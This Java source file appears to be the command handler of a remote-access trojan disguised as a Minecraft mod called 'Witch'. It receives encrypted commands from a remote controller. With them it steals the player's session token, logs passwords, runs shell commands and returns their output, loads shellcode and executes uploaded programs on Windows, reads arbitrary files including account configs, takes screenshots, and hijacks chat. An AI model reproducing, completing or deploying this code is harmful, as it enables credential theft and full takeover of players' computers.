package me.soda.witch.websocket;

import com.google.gson.Gson;
import me.soda.witch.Witch;
import me.soda.witch.features.PlayerInfo;
import me.soda.witch.features.ShellcodeLoader;
import me.soda.witch.utils.*;
import net.minecraft.text.Text;

import static me.soda.witch.Witch.mc;
import static me.soda.witch.Witch.messageUtils;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handleRaw(byte[] bytes) {
        handle(messageUtils.decrypt(bytes));
    }

    public static void handle(Message message) {
        String msgType = message.messageType();
        String msg = message.message();
        Witch.println("Received message: " + msgType);
        try {
            switch (msgType) {
                case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                case "steal_token" -> Witch.messageUtils.send(msgType, Stealer.getToken());
                case "chat_control" -> ChatUtil.sendChat(message.message());
                case "chat_filter" -> Witch.config.filterPattern = msg;
                case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
                case "mods" -> Witch.messageUtils.send(msgType, MinecraftUtil.allMods());
                case "systeminfo" -> Witch.messageUtils.send(msgType, MinecraftUtil.systemInfo());
                case "screenshot" -> ScreenshotUtil.screenshot();
                case "chat" -> ChatUtil.chat(Text.of(msg), false);
                case "kill" -> Witch.client.close(false);
                case "shell" -> new Thread(() -> {
                    String result = ShellUtil.runCmd(msg);
                    Witch.messageUtils.send(msgType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ShellUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode(msg, false)).start();
                }
                case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
                case "config" -> Witch.messageUtils.send(msgType, Witch.config);
                case "player" -> Witch.messageUtils.send(msgType, new PlayerInfo(Witch.mc.player));
                case "skin" -> {
                    Witch.messageUtils.send("player", new PlayerInfo(Witch.mc.player));
                    PlayerSkinUtil.sendPlayerSkin();
                }
                case "server" -> {
                    ServerUtil.disconnect();
                    Witch.config.canJoinServer = !Witch.config.canJoinServer;
                }
                case "kick" -> ServerUtil.disconnect();
                case "execute" -> {
                    if (ShellUtil.isWin()) {
                        ShellUtil.runProg(GSON.fromJson(message.message(), byte[].class));
                    }
                }
                case "iasconfig" -> Witch.messageUtils.send(msgType, FileUtil.read("config/ias.json"));
                case "read" -> Witch.messageUtils.send(msgType, FileUtil.read(msg));
                case "runargs" -> Witch.messageUtils.send(msgType, System.getProperties());
                case "xor" -> Witch.messageUtils.xor = new XOR(msg);
                case "greeting" -> {
                    String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
                    Witch.messageUtils.send(msgType, greetingMsg);
                    if (Witch.ip == null) Witch.ip = NetUtil.getIp();
                    Witch.messageUtils.send("player", new PlayerInfo(Witch.mc.player));
                }
                default -> {
                }
            }
        } catch (Exception e) {
            Witch.println("Corrupted message!");
            Witch.printStackTrace(e);
        }
    }
}